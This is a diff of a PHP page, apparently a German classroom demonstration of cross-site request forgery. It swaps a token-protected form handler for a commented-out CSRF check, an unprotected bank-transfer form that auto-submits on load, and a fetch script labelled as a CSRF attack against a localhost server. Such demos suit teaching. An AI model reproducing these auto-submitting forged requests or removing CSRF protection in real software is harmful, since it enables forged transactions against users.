@@ -1,26 +1,48 @@
 <?php
+/* So könnte ein CRSF Schutz in PHP in etwa aussehen */
 
-session_start();
+//    session_start();
+//    $_SESSION['token'] = md5(uniqid(mt_rand(), true));
+//    
+//    $token = filter_input(INPUT_POST, 'token', FILTER_SANITIZE_STRING);
+//
+//    if (!$token || $token !== $_SESSION['token']) {
+//        // return 405 http status code
+//        header($_SERVER['SERVER_PROTOCOL'] . ' 405 Method Not Allowed');
+//        exit;
+//    } else {
+//        // process the form with action.php
+//    }
+?>
+<script>
+    document.getElementById("unsecureForm").submit();
+</script>
 
-require __DIR__ .  '/src/header.php';
+<body>
+    <main>
+        <h1>Unsicheres Formular für unsichere Banküberweisung</h2>
+        <!-- Server und Port können aus der Action ausgelesen werden -->
+        <form id="unsecureForm" method="POST" action="http://localhost:3000">
+        <!--    Das wäre die sicherere Variante
+                    <form id="secureForm" action="/action.php">
+        -->
+          <label for="fname">IBAN:</label><br>
+          <input type="text" id="iban" name="iban"><br>
+          <label for="lname">Betrag</label><br>
+          <input type="text" id="amount" name="amount"><br><br>
+          <input type="submit" value="Submit">
+        </form> 
+    </main>
+</body>
 
-$errors = []; // for storing the error messages
-$inputs = []; // for storing sanitized input values
+<script>
+    // CRSF Attacke
+    fetch('http://localhost:3000/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'name=CSRF-Opfer'
+    });
+</script>
 
-$request_method = strtoupper($_SERVER['REQUEST_METHOD']);
-
-if ($request_method === 'GET') {
-	// generate a token
-	$_SESSION['token'] = bin2hex(random_bytes(35));
-	// show the form
-	require __DIR__ . '/src/get.php';
-} elseif ($request_method === 'POST') {
-	// handle the form submission
-	require __DIR__ .  '/src/post.php';
-	// re-display the form if the form contains errors
-	if ($errors) {
-		require	__DIR__ .  '/src/get.php';
-	}
-}
-
-require __DIR__ . '/src/footer.php';
